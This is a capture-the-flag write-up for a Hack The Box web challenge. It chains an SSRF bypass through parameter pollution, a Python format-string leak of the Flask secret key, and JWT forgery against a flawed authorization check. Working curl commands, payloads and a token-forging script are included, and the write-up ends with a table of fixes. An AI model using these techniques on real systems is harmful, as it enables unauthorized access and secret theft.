# Offlinea

--- 



## Architecture

```
[Browser]
   │
   ▼
┌──────────────────────┐         ┌───────────────────────────┐
│ PHP frontend         │  SSRF   │ Flask backend             │
│ bartender.php        │────────▶│ app.py                    │
│ (exposed port)       │         │ 127.0.0.1:5000 (internal) │
└──────────────────────┘         └───────────────────────────┘
   │                                       │
   │ 302 → /pdfs/results-<id>.pdf          │ Selenium renders
   ▼                                       ▼
 PDF file                              /logs, /bartender
```



# The Big Picture

This challenge chains **three vulnerabilities** together:

1. **HTTP Parameter Pollution (HPP)** to bypass SSRF protection
2. **Python format string injection** to leak the Flask `SECRET_KEY`
3. **JWT forgery** (plus a logic bug) to access the protected `/bartender` endpoint

The flag is returned inside a generated PDF.

---

## Step 1: Understand the Architecture

From your local files, look at the two directories:

```bash
challenge/service/     # PHP frontend (bartender.php)
challenge/internal/    # Flask backend (app.py)
```

**PHP frontend** (`bartender.php`, port 8000):
- Takes `url`, `name`, `secret` parameters
- Validates the URL (SSRF protection — blocks internal IPs)
- Sends the URL to the Flask backend for "processing"

**Flask backend** (`app.py`, port 5000):
- `/generate` — Uses Selenium/headless browser to visit URLs
- `/bartender` — Returns secrets, **requires JWT with `is_admin: true`**
- `/logs` — Shows URL history, **has a format string vulnerability**

**The core problem**: You can't reach `/bartender` directly because it's internal and JWT-protected. You need to make the backend visit it for you.

<img width="1919" height="642" alt="image" src="https://github.com/user-attachments/assets/e7a62300-5705-4a72-b836-b268410f52ba" />


---

## Step 2: SSRF Bypass via Parameter Pollution

### The vulnerability

PHP and Flask parse duplicate query parameters differently:

| Framework | `?url=A&url=B` → uses |
|-----------|----------------------|
| **PHP** | **Last** value (`B`) |
| **Flask** | **First** value (`A`) |

**PHP validates** the last `url` (a safe public URL like `http://info.cern.ch/`), so SSRF checks pass.
**Flask visits** the first `url` (your internal target like `http://127.0.0.1:5000/logs`).



---

## Step 3 — Leak the `SECRET_KEY` via format-string injection

The `/logs` handler formats each stored URL through Python's `.format()`. If a stored URL contains `{logify.__globals__[app].config}`, the renderer substitutes the Flask config dict, including `SECRET_KEY`.

The payload only renders if it is already stored in history. Send one baseline request first (Step 1), then send the payload.

```bash
PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('{logify.__globals__[app].config}'))")

curl -sL "http://$TARGET:$PORT/bartender.php?url=http://127.0.0.1:5000/logs?$PAYLOAD&url=http://info.cern.ch/&name=test&secret=test" -o leak.pdf

pdftotext leak.pdf - | grep -oE "'SECRET_KEY': '[a-f0-9]+'"
```

Example output:

```
'SECRET_KEY': 'f1eeff682856f8716871824247ba2d4bb255e45fc48529d2f42d6cf7a65c7ad2'
```

The key is unique to each HTB deployment. Use the one your instance leaks.



<img width="1712" height="178" alt="image" src="https://github.com/user-attachments/assets/8485b42a-638b-48df-b033-211a78cb7e8b" />





---

## Step 4: Forge the JWT (and Exploit the Logic Bug)

### The authorization bug

The `/bartender` endpoint checks:

```python
if not data.get('is_admin') and data.get('username') == 'bartender':
    return jsonify({'message': 'Admin access required!'}), 403
```

The 403 fires **only when both** conditions are true:
- `is_admin` is falsy
- `username` is exactly `"bartender"`

**Truth table** :

| `is_admin` | `username` | `not is_admin and username=='bartender'` | Result |
|-----------|-----------|------------------------------------------|--------|
| `true` | `bartender` | `False and True` → **False** | ✅ **Allowed** |
| `false` | `alice` | `True and False` → **False** | ✅ Allowed |
| `true` | `alice` | `False and False` → **False** | ✅ Allowed |
| `false` | `bartender` | `True and True` → **True** | ❌ Blocked |

So `{"is_admin": true, "username": "bartender"}` passes. The intended check was probably "must be admin," but the boolean logic is broken.

### Forge the token


```python
import hmac, hashlib, base64, json

SECRET_KEY = "f1eeff682856f8716871824247ba2d4bb255e45fc48529d2f42d6cf7a65c7ad2"

def b64url(x: bytes) -> str:
    return base64.urlsafe_b64encode(x).rstrip(b"=").decode()

header  = b64url(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(",",":")).encode())
payload = b64url(json.dumps({"is_admin": True, "username": "bartender"}, separators=(",",":")).encode())
sig     = b64url(hmac.new(SECRET_KEY.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest())

print(f"{header}.{payload}.{sig}")
```

<img width="1272" height="82" alt="image" src="https://github.com/user-attachments/assets/0769781c-087c-4712-a686-609498c496a5" />



---

## Step 5 — Access `/bartender` and retrieve the flag

Fully URL-encode the inner URL. It contains `?` and `&` that would otherwise be parsed by the outer query string.

```bash
JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc19hZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJiYXJ0ZW5kZXIifQ.Tq4A4OVYVa5kIVo1fvt3iQbazWWAOtfyfz5o0isXApk"

INNER=$(python3 -c "
import urllib.parse, sys
print(urllib.parse.quote(f'http://127.0.0.1:5000/bartender?token={sys.argv[1]}', safe=''))
" "$JWT")

curl -sL "http://$TARGET:$PORT/bartender.php?url=$INNER&url=http%3A%2F%2Finfo.cern.ch%2F&name=test&secret=test" -o flag.pdf

pdftotext flag.pdf - | grep -oE 'HTB\{[^}]+\}'
```

Flask returns the flag as the response body, and the PHP frontend wraps it into a PDF.


<img width="1360" height="264" alt="image" src="https://github.com/user-attachments/assets/f39d8884-8e59-4d5a-82e9-0b197d7c1bb7" />


---




| Vulnerability | Root cause | Fix |
|--------------|-----------|-----|
| SSRF via HPP | PHP and Flask resolve duplicate parameters differently | Use a single parser end-to-end; reject duplicate parameters; allowlist destinations |
| Format-string injection | Untrusted strings passed to `.format()` | Never `.format()` untrusted input; use `string.Template` which has no attribute-access syntax (`format_map` is not safe) |
| JWT forgeable | Secret exposed via `app.config` | Do not render config; rotate secrets; use asymmetric signing (`RS256`) |
| Logic bug | `not A and B` is not `not (A and B)` | Write the intended condition explicitly and unit-test it |
---












